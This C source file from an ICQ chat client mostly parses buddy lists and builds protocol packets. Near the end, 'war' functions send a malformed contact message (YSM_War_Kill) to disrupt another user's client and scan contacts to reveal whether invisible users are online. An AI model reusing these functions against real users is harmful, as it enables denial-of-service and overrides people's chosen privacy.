     * 0x66 and other tlvs are ignored, why would we want em huh HUH =P */

    while (xtralen > 0)
    {
        bsReadTlv(bsd, &tlv);
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            /* Which means Extra Data Nick Incoming! */
            case 0x131:
                nick = YSM_CALLOC(1, tlv.len+1);
                bsRead(bsd, nick, tlv.len);
                break;

                /* Awaiting auth from this slave */
            case 0x66:
                DEBUG_PRINT("awaiting authorization from %s", uin);
                break;

                /* Fine, no Nick found then */
            default:
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
        xtralen -= SIZEOF_TLV_HEAD + tlv.len;
    }

    if (nick != NULL)
    {
        YSM_CharsetConvertString(&nick, CHARSET_INCOMING, MFLAGTYPE_UTF8, TRUE);
        if (parseSlave(nick) == 0)
        {
            YSM_FREE(nick);
        }
    }

    /* debugging info */
    printfOutput(VERBOSE_SDOWNLOAD, "INFO ADDING %ld %s\n",
            uin, nick ? nick : "");

    buddyAddSlave(nick, uin, ssi->itemId, ssi->groupId, ssi->type);

    if (nick != NULL)
        YSM_FREE(nick);
}

void ssiReadGroupRecord(ssi_item_head_t *ssi, bsd_t bsd)
{
    bs_pos_t  pos;
    tlv_t     tlv;
    uint8_t  *buf;
    uint16_t  dataLen;

    if (ssi == NULL)
        return;

    dataLen = ssi->len;

    if (ssi->groupId == 0 && ssi->itemId == 0)
    {
        /* This is a master group */

        g_sinfo.flags |= FL_DOWNLOADEDSLAVES;

        while (dataLen > 0)
        {
            pos = bsTell(bsd);
            bsReadTlv(bsd, &tlv);

            /* The Groups listing did show up, skip it! dammit! */
            if (tlv.type == 0xC8)
            {
                /* Make a global allocated area where to store
                   the existing GroupIDS */

                if (buf = YSM_MALLOC(tlv.len))
                {
                    bsRead(bsd, buf, tlv.len);
                    bsAppend(g_sinfo.blgroupsid, buf, tlv.len);
                    g_sinfo.blgroupsidentries = tlv.len/2;
                    YSM_FREE(buf);
                }
            }

            /* jump to next tlv */
            bsSeek(bsd, pos + SIZEOF_TLV_HEAD + tlv.len, BS_SEEK_SET);
            dataLen -= SIZEOF_TLV_HEAD + tlv.len;
        }
    }
    else if (ssi->itemId == 0)
    {
        /* A group */

        if (dataLen == 0)
        {
            /* Empty group, but check if it is OUR group so we don't
             * make the mistake of creating it twice! */
            if (ssi->groupId == YSM_BUDDY_GROUPID)
            {
                g_sinfo.blusersidentries = 0;
            }
            return;
        }

        while (dataLen != 0)
        {
            pos = bsTell(bsd);
            bsReadTlv(bsd, &tlv);

            switch (tlv.type)
            {
                /* Users ID */
                /* Use the amm of IDS for knowing the amm */
                /* of slaves in the group */
                case 0xC8:
                    /* If its the YSM Group, we need the list of Buddy */
                    /* Ids stored in our users list. */
                    if (ssi->groupId == YSM_BUDDY_GROUPID)
                    {
                        if (tlv.len != 0)
                        {
                            if ((buf = YSM_MALLOC(tlv.len)) != NULL)
                            {
                                bsRead(bsd, buf, tlv.len);
                                bsAppend(g_sinfo.blusersid, buf, tlv.len);
                                g_sinfo.blusersidentries = tlv.len/2;
                                YSM_FREE(buf);
                            }
                        }
                        else
                        {
                            /* The Group exists, but its empty.
                               Do NOT re-create the group! */
                            g_sinfo.blusersidentries = 0;
                        }
                    }
                    break;

                default:
                    break;
            }

            /* jump to next tlv */
            bsSeek(bsd, pos + SIZEOF_TLV_HEAD + tlv.len, BS_SEEK_SET);
            dataLen -= SIZEOF_TLV_HEAD + tlv.len;
        }
    }
    else
    {
        DEBUG_PRINT("Not a group in SSI group record received!");
    }
}

void YSM_BuddyIncomingList(bsd_t bsd)
{
    uint16_t         itemsCount;
    uint16_t         dataLen;
    ssi_item_head_t  ssi;
    int32_t          amount = 0;
    bs_pos_t         itemPos;
    uint16_t         itemLen;
    uint8_t          byte;

    DEBUG_PRINT("");

    bsSeek(bsd, SIZEOF_BYTE, BS_SEEK_CUR); /* SSI protocol version (!?) */

    /* Amount of modifications by now (We need this for future mods) */
    bsReadWord(bsd, &itemsCount);

    /* For future changes, we mark our next change already */
    g_sinfo.blentries = itemsCount + 1;

    DEBUG_PRINT("itemsCount: %d", itemsCount);

    /* DAMN! Parse the items and get to the GROUPS! */
    for (; itemsCount > 0; itemsCount--)
    {
        itemPos = bsTell(bsd);
        itemLen = 0;

        itemLen += bsReadWord(bsd, &dataLen);  /* length of the item name */

        DEBUG_PRINT("item: %d, nameLen: %d", itemsCount, dataLen);

        if (dataLen > 0)
        {
            ssi.name = YSM_CALLOC(1, dataLen+1);
            bsRead(bsd, ssi.name, dataLen);
            DEBUG_PRINT("itemName: %s (%d)", ssi.name, itemsCount);
            itemLen += dataLen;
        }
        else
            ssi.name = NULL;

        bsReadWord(bsd, &ssi.groupId);
        bsReadWord(bsd, &ssi.itemId);
        bsReadWord(bsd, &ssi.type);
        bsReadWord(bsd, &ssi.len);
        itemLen += 4*SIZEOF_WORD + ssi.len;

        switch (ssi.type)
        {
            case YSM_BUDDY_GROUP:
                ssiReadGroupRecord(&ssi, bsd);
                break;

                /* If it wasn't a group, it might be a slave */
                /* in a special status (visible, invisible, ignore) */
                /* or without a group, yes its possible fuckn srv */

            case YSM_BUDDY_SLAVE:
            case YSM_BUDDY_SLAVE_INV:
            case YSM_BUDDY_SLAVE_IGN:
            case YSM_BUDDY_SLAVE_VIS:
                ssiReadBuddyRecord(&ssi, bsd);
                amount++;
                break;

            case 0x0004:
                /* Permit/deny settings or/and bitmask of the AIM classes */

                /* Check if its our Privacy Settings */
                g_sinfo.blprivacygroupid = ssi.itemId;

                /* Check the current setting. */
                /* If we left invisible, change the status */
                /* to invisible again. */
                /* If we WANT invisible, turn to invisible 2 */
                bsSeek(bsd, SIZEOF_DWORD + SIZEOF_WORD + SIZEOF_TLV_HEAD,
                        BS_SEEK_CUR);
                bsReadByte(bsd, &byte);
                if (byte == 0x2 || byte == 0x3
                        || g_model.status == STATUS_INVISIBLE)
                {
                    changeStatus(STATUS_INVISIBLE);
                }
                break;

            default:
                ;
        }

        if (ssi.name != NULL)
        {
            YSM_FREE(ssi.name);
        }

        bsSeek(bsd, itemPos + itemLen, BS_SEEK_SET);
    }

    /* Print some shocking message :) New slaves are always welcome. */
    printfOutput(VERBOSE_BASE,
            "INFO d[O_o]b %d %s\n", amount, MSG_DOWNLOADED_SLAVES);

    sendBuddyAck();
}

static const uint8_t icq2003avstring[] =
{
    0x00,0x01,0x00,0x03,0x01,0x10,0x04,0x7c,
    0x00,0x13,0x00,0x02,0x01,0x10,0x04,0x7c,
    0x00,0x02,0x00,0x01,0x01,0x01,0x04,0x7c,
    0x00,0x03,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x15,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x04,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x06,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x09,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x0A,0x00,0x01,0x01,0x10,0x04,0x7c,
    0x00,0x0B,0x00,0x01,0x01,0x10,0x04,0x7c,
};

void sendCliReady(void)
{
    static const uint8_t icq2000vstring[] =
    {
        0x00,0x01,0x00,0x03,0x01,0x10,0x02,0x8A,0x00,0x02,0x00,
        0x01,0x01,0x01,0x02,0x8A,0x00,0x03,0x00,0x01,0x01,0x10,
        0x02,0x8A,0x00,0x15,0x00,0x01,0x01,0x10,0x02,0x8A,0x00,
        0x04,0x00,0x01,0x01,0x10,0x02,0x8A,0x00,0x06,0x00,0x01,
        0x01,0x10,0x02,0x8A,0x00,0x09,0x00,0x01,0x01,0x10,0x02,
        0x8A,0x00,0x0A,0x00,0x01,0x01,0x10,0x02,0x8A,
    };

    sendSnac(YSM_BASIC_SERVICE_SNAC, CLI_READY, 0x0,
            icq2000vstring,
            sizeof(icq2000vstring),
            g_sinfo.seqnum++,
            0);
}

void sendIcbmParams(void)
{
    static const int8_t icqICBM[] =
    {
        0x00,0x00,              /* channel to setup */
        0x00,0x00,0x00,0x03,    /* messages flags */ 
        0x1F,0x40,              /* max message snac size */
        0x03,0xE7,              /* max sender warning level */
        0x03,0xE7,              /* max receiver warning level */
        0x00,0x00,              /* minimum message interval (sec) */
        0x00,0x00,              /* unknown */
    };

    sendSnac(YSM_MESSAGING_SNAC, SET_ICBM_PARAMS, 0x0,
            icqICBM,
            sizeof(icqICBM),
            g_sinfo.seqnum++,
            0);
}

void sendCapabilities(void)
{
    static const uint8_t icqCapabilities[] =
    {
        CAP_PRECAP CAP_SRVRELAY CAP_POSCAP
            CAP_PRECAP CAP_ISICQ    CAP_POSCAP
#ifdef YSM_USE_CHARCONV
            CAP_PRECAP CAP_UTF8     CAP_POSCAP
#endif
    };

    bsd_t    bsd;
    bs_pos_t tlv5;

    bsd = initBs();
    tlv5 = bsAppendTlv(bsd, 0x05, 0, NULL);
    /* without null-terminator */
    bsAppend(bsd, icqCapabilities, sizeof(icqCapabilities) - 1);
    bsUpdateTlvLen(bsd, tlv5);

    sendSnac(0x02, 0x04, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

int32_t sendMetaInfoReq(uin_t uin, int16_t subType)
{
    bsd_t     bsd;
    bs_pos_t  tlv1;
    bs_pos_t  len;
    int32_t   reqId;

    bsd = initBs();

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);           /* data chunk size */
    bsAppendDwordLE(bsd, g_model.uin);     /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);            /* request type: META_DATA_REQ */
    bsAppendWordLE(bsd, 0x0000);            /* request sequence number */
    bsAppendWordLE(bsd, subType);           /* request subtype */
    bsAppendDwordLE(bsd, uin);              /* uin to search */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    reqId = uin & 0xffffff7f;

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            reqId);

    freeBs(bsd);

    return reqId;
}

void sendOfflineMsgsReq(void)
{
    bsd_t    bsd;
    bs_pos_t tlv1;
    bs_pos_t len;

    DEBUG_PRINT("");

    bsd = initBs();

    /* TLV 0x01: encapsulated META_DATA */
    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);         /* data chunk size */
    bsAppendDwordLE(bsd, g_model.uin);   /* client uin */
    bsAppendWordLE(bsd, 0x3C);            /* data type: offline msgs request */
    bsAppendWordLE(bsd, 0x00);            /* request id */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x00,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

void sendDeleteOfflineMsgsReq(void)
{
    bsd_t    bsd;
    bs_pos_t tlv1;
    bs_pos_t len;

    DEBUG_PRINT("");

    bsd = initBs();

    /* TLV 0x01: encapsulated META_DATA */
    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);          /* data chunk size */
    bsAppendDwordLE(bsd, g_model.uin);    /* client uin */
    bsAppendWordLE(bsd, 0x3E);             /* data type: delete offline msgs */
    bsAppendWordLE(bsd, 0x00);             /* request id */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x00,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

void sendICBMRightsReq(void)
{
    sendSnac(YSM_MESSAGING_SNAC, YSM_REQUEST_PARAM_INFO, 0x00,
            NULL, 0, g_sinfo.seqnum++, 0);
}

void sendBuddyRightsReq(void)
{
    sendSnac(0x03, 0x02, 0x00,
            NULL, 0, g_sinfo.seqnum++, 0);
}

void sendCheckContactsReq(void)
{
    bsd_t bsd;

    bsd = initBs();

    bsAppendDword(bsd, 0); /* modification date/time of client local SSI copy */
    bsAppendWord(bsd, 0);  /* numbers of items in client local SSI copy */

    sendSnac(YSM_ICQV8FUNC_SNAC, YSM_CLI_REQ_ROSTER, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

void YSM_RequestPersonal(void)
{
    sendSnac(0x01, 0x0E, 0x0,
            NULL, 0, g_sinfo.seqnum++, 0x0E);

    /* Not only send the damn 01 0E snac, get our info too! */
    sendMetaInfoReq(g_model.uin, CLI_FULLINFO2_REQ);
}

void YSM_RequestRates(void)
{
    DEBUG_PRINT("");

    sendSnac(0x01, 0x06, 0x0, NULL, 0, g_sinfo.seqnum++, 0);

    DEBUG_PRINT("");
}

void YSM_RequestAutoMessage(slave_t *victim)
{
    int8_t mtype = 0;
    int8_t data[2];

    if (victim == NULL) return;

    switch (victim->status)
    {
        case STATUS_AWAY:
            mtype = YSM_MESSAGE_GETAWAY;
            break;
        case STATUS_DND:
            mtype = YSM_MESSAGE_GETDND;
            break;
        case STATUS_NA:
            mtype = YSM_MESSAGE_GETNA;
            break;
        case STATUS_OCCUPIED:
            mtype = YSM_MESSAGE_GETOCC;
            break;
        case STATUS_FREE_CHAT:
            mtype = YSM_MESSAGE_GETFFC;
            break;
        default:
            return;
    }

    data[0] = 0x00;
    data[1] = 0x00;

    sendMessage2Client(victim,
            0x02,
            mtype,
            data,
            1,
            0x03,
            MFLAGTYPE_NORM,
            rand() & 0xffffff7f);
}

void sendFindByMailReq(uint8_t *contactMail)
{
    bsd_t     bsd;
    bs_pos_t  tlv1;
    bs_pos_t  len;
    bs_pos_t  tlvLen;

    bsd = initBs();

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);           /* data chunk size */
    bsAppendDwordLE(bsd, g_model.uin);     /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);            /* request type: META_DATA_REQ */
    bsAppendWordLE(bsd, 0x0000);            /* request sequence number */
    bsAppendWordLE(bsd, 0x0573);            /* request subtype */
    bsAppendWordLE(bsd, 0x015E);            /* TLV 0x015E: email to search */
    tlvLen = bsAppendWordLE(bsd, 0);        /* tlv len */
    bsAppendWordLE(bsd, strlen(contactMail)+1); /* stringz len */
    bsAppendPrintfStringZ(bsd, contactMail);
    bsUpdateWordLELen(bsd, tlvLen);
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}


void sendSetBasicUserInfoReq(void)
{
    bsd_t     bsd;
    bs_pos_t  tlv1;
    bs_pos_t  len;
    uint8_t   publishMail = 0x1;

    bsd = initBs();

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);           /* data chunk size */
    bsAppendDwordLE(bsd, g_model.uin);     /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);            /* request type: META_DATA_REQ */
    bsAppendWordLE(bsd, 0x0000);            /* request sequence number */
    bsAppendWordLE(bsd, 0x03EA);            /* request subtype */

    bsAppendWordLE(bsd, strlen(g_model.user.nickName)+1);  /* stringz len */
    bsAppendPrintfStringZ(bsd, g_model.user.nickName);
    bsAppendWordLE(bsd, strlen(g_model.user.firstName)+1); /* stringz len */
    bsAppendPrintfStringZ(bsd, g_model.user.firstName);
    bsAppendWordLE(bsd, strlen(g_model.user.lastName)+1);  /* stringz len */
    bsAppendPrintfStringZ(bsd, g_model.user.lastName);
    bsAppendWordLE(bsd, strlen(g_model.user.email)+1);     /* stringz len */
    bsAppendPrintfStringZ(bsd, g_model.user.email);
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for city */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for state */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for phone */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for fax */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for address */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for cellular */
    bsAppendWordLE(bsd, 0);         /* stringz len */
    bsAppendByte(bsd, 0);           /* empty stringz for zip */
    bsAppendWordLE(bsd, 0);         /* country code */
    bsAppendByte(bsd, 0);           /* GMT offset */
    bsAppendByte(bsd, publishMail); /* publish primary email flag */

    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

void sendSetPasswordReq(uint8_t *newPassword)
{
    bsd_t    bsd;
    bs_pos_t tlv1;
    bs_pos_t len;

    bsd = initBs();
    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    len = bsAppendWordLE(bsd, 0);
    bsAppendDwordLE(bsd, g_model.uin);
    bsAppendWordLE(bsd, 0x07D0);                  /* data type */
    bsAppendWordLE(bsd, 0x02);                    /* request sequence number */
    bsAppendWordLE(bsd, 0x042E);                  /* data subtype */
    bsAppendWordLE(bsd, strlen(newPassword) + 1); /* password stringz length */
    bsAppendPrintfStringZ(bsd, newPassword);      /* password stringz */
    bsUpdateWordLELen(bsd, len);
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0,
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++,
            0);

    freeBs(bsd);
}

void sendKeepAlive(void)
{
    bsd_t    bsd;
    bs_pos_t tlv1;

    bsd = initBs();

    printfOutput(VERBOSE_MOATA, "INFO Sending KEEP Alive Packet.\n");

    tlv1 = bsAppendTlv(bsd, 0x01, 0, NULL);
    bsAppendWordLE(bsd, 0x08);          /* data chunk size (TLV.len - 2) */
    bsAppendDwordLE(bsd, g_model.uin); /* request owner uin */
    bsAppendWordLE(bsd, 0x07D0);        /* request type */
    bsAppendWordLE(bsd, 0x0000);        /* request sequence number */
    bsUpdateTlvLen(bsd, tlv1);

    sendSnac(YSM_MULTIUSE_SNAC, YSM_CLI_SEND_REQ, 0x0, 
            bsGetBuf(bsd),
            bsGetLen(bsd),
            g_sinfo.seqnum++, 0);

    freeBs(bsd);
}

/* Attention, datalist must be in the following format:
 *
 * UIN (ascii) 0xFE  NICK (ascii) 0xFE
 * and so on for each contact you want to send
 * and amount is in string, examples are : '1', "20", etc :)
 */

void YSM_SendContact(slave_t *victim, char *datalist, char *am)
{
    char *smashed_slices_of_rotten_meat;
    int buf_len = 0, tsize = 0;

    buf_len = strlen(am) + 1 + strlen(datalist);

    smashed_slices_of_rotten_meat = YSM_CALLOC(1, buf_len);

    /* amount of contacts to send , its in ascii */
    memcpy(smashed_slices_of_rotten_meat+tsize, am, strlen(am));
    tsize += strlen(am);
    smashed_slices_of_rotten_meat[tsize] = (char)0xFE;
    tsize ++;
    memcpy(smashed_slices_of_rotten_meat+tsize, datalist, strlen(datalist));
    tsize += strlen(datalist);

    if (victim->d_con.flags & DC_CONNECTED)
    {
        YSM_DC_Message(victim,
                &smashed_slices_of_rotten_meat[0],
                tsize,
                YSM_MESSAGE_CONTACTS);
    }
    else
    {
        sendMessage2Client(victim,
                0x04,
                YSM_MESSAGE_CONTACTS,
                smashed_slices_of_rotten_meat,
                tsize,
                0x00,
                0x00,
                rand() & 0xffffff7f);
    }

    YSM_FREE(smashed_slices_of_rotten_meat);
}

void YSM_SendUrl(slave_t *victim, int8_t *url, int8_t *desc)
{
    int8_t  *data = NULL;
    int32_t  size = 0;

    size = strlen(url) + strlen(desc) + 3;
    data = YSM_CALLOC(1, size);

    size = 0;
    memcpy( data+size, desc, strlen(desc));
    size += strlen(desc);
    data[size] = (char)0xFE;
    size ++;
    memcpy( data+size, url, strlen(url) );
    size += strlen(url) + 1;
    data[size] = (char)0xFE;

    if (victim->d_con.flags & DC_CONNECTED)
    {
        YSM_DC_Message(victim, data, size, YSM_MESSAGE_URL);
    }
    else
    {
        sendMessage2Client(victim,
                0x04,
                YSM_MESSAGE_URL,
                data,
                size,
                0x00,
                0x00,
                rand() & 0xffffff7f);
    }

    YSM_FREE(data);
}

void YSM_SendRTF(slave_t *victim)
{
    static int8_t rtfmessage[] =
        "{\\rtf1\\ansi\\ansicpg1252\\deff0\\deflang1033{\\fonttbl{\\f0"
        "\\fnil\\fcharset0 Times New Roman;}}\r\n"
        "{\\colortbl ;\\red0\\green0\\blue0;}\r\n"
        "\\viewkind4\\uc1\\pard\\cf1\\f0\\fs20<##icqimage0001> \\par\r\n"
        "}\r\n";
    uint8_t flags = 0;

    flags |= MFLAGTYPE_NORM | MFLAGTYPE_RTF;

    sendMessage2Client(
            victim,
            0x02,
            YSM_MESSAGE_NORMAL,
            rtfmessage,
            sizeof(rtfmessage),
            0x00,
            flags,
            0x06000c00);
}

/* Can either be call from 4,1 or 4,c, check inside */

void incomingScanRsp(snac_head_t *snac)
{
    slave_t *slave = NULL;

    lockSlaveList();

    while ((slave = getNextSlave(slave)) != NULL)
    {
        if (snac->reqId == slave->reqId)
        {
            g_sinfo.scanqueue--;

            /* check if the user is waiting in a scan */
            if (slave->flags & FL_SCANNED)
            {
                if (snac->subTypeId == 0x01)
                {
                    printfOutput(VERBOSE_BASE, "INFO SCAN %ld %s CONNECTED\n",
                            slave->uin, slave->info.nickName);
                }
                else if (snac->subTypeId == 0x0C)
                {
                    printfOutput(VERBOSE_BASE, "INFO SCAN %ld %s NOT_CONNECTED\n",
                            slave->uin, slave->info.nickName);
                }
                slave->flags ^= FL_SCANNED;
            }
            break;
        }
    }
 
    unlockSlaveList();
}

static void YSM_Scan_Slave(slave_t *slave)
{
    int8_t  dead_slave_skull[3];
    int32_t buf_len = 0, tsize = 0, reqId = 0;

    buf_len = sizeof(dead_slave_skull);
    memset(dead_slave_skull, 0, buf_len);

    /* length of the following msg */
    dead_slave_skull[1] = 0x01;
    tsize += 3; /* last byte 0 */

    reqId = rand() & 0xffffff7f;
    /* We hard-code E8 since its the same, Get AWAY automsg */
    sendMessage2Client(
            slave,
            0x02,
            0xE8,
            dead_slave_skull,
            tsize,
            0x19,
            0x00,
            reqId);

    slave->reqId = reqId;
}

/*
 * Set of Slave Punishment functions.
 * * Attention * No real slaves were wasted during testings of these functions.
 * Any simmilarity with reality is just pure coincidence.
 **/

void YSM_War_Kill(slave_t *victim)
{
    char *smelling_poison, *kill_uin = "66666666666", *kill_nick = "YSM__d0ll";
    int buf_len = 0, tsize = 0;

    buf_len = strlen(kill_uin) + 1 + strlen(kill_nick) + 1;
    smelling_poison = YSM_CALLOC(1, buf_len);

    memcpy(&smelling_poison[0], kill_uin, strlen(kill_uin));
    tsize += strlen(kill_uin);
    smelling_poison[tsize] = (char)0xFE;
    tsize++;
    memcpy(smelling_poison+tsize, kill_nick, strlen(kill_nick));
    tsize += strlen(kill_nick);
    smelling_poison[tsize] = (char)0xFE;
    tsize++;

    YSM_SendContact(victim, &smelling_poison[0], "65535");
    YSM_CloseDC(victim);

    printfOutput(VERBOSE_BASE, "INFO ..blood in my hands..i'm done with the job.\n");

    YSM_FREE(smelling_poison);
}

/* Thanks to an anonymous liquidk for the required info =) */
/* You are credited as a heroe. heh.               */

void YSM_War_Scan(slave_t *victim)
{
    slave_t    *slave = NULL;
    sl_flags_t  flags = 0;
    uint8_t     nick[MAX_NICK_LEN];
    int32_t     count = 0;

    printfOutput(VERBOSE_BASE, "Please wait...\n");
    if (victim != NULL)
    {
        lockSlaveList();

        if (!(victim->flags & FL_SCANNED))
        {
            g_sinfo.scanqueue++;
            YSM_Scan_Slave(victim);
            victim->flags |= FL_SCANNED;
        }
        else
        {
            printfOutput(VERBOSE_BASE,
                    "INFO Wait! already waiting a reply from this slave!");
        }

        unlockSlaveList();

        return;
    }

    /* Err this part of the code needs to be re-implemented */
    /* scanning a whole list is a huge problem, only works now */
    /* for a specified slave.                */

    lockSlaveList();

    while ((slave = getNextSlave(slave)) != 0)
    {
        if (count >= MAX_SCAN_COUNT)
            break;

        if (!(slave->flags & FL_SCANNED))
        {
            printfOutput(VERBOSE_BASE, "INFO Scanning %s...\n",
                    slave->info.nickName);
            YSM_Scan_Slave(slave);
            slave->flags |= FL_SCANNED;
            count++;
        }
    }

    unlockSlaveList();

    g_sinfo.scanqueue += MAX_SCAN_COUNT;

    printfOutput(VERBOSE_BASE,
            "Please wait until %d results show up (or the few left).\n",
            MAX_SCAN_COUNT);

    printfOutput(VERBOSE_BASE,
            "Use 'scan' again to scan the missing slaves "
            "in groups of %d.\n", MAX_SCAN_COUNT);

    if (!count)
    {
        printfOutput(VERBOSE_BASE,
                "-- done with ALL SLAVES. (yo'r welcome).\n" );
    }
}
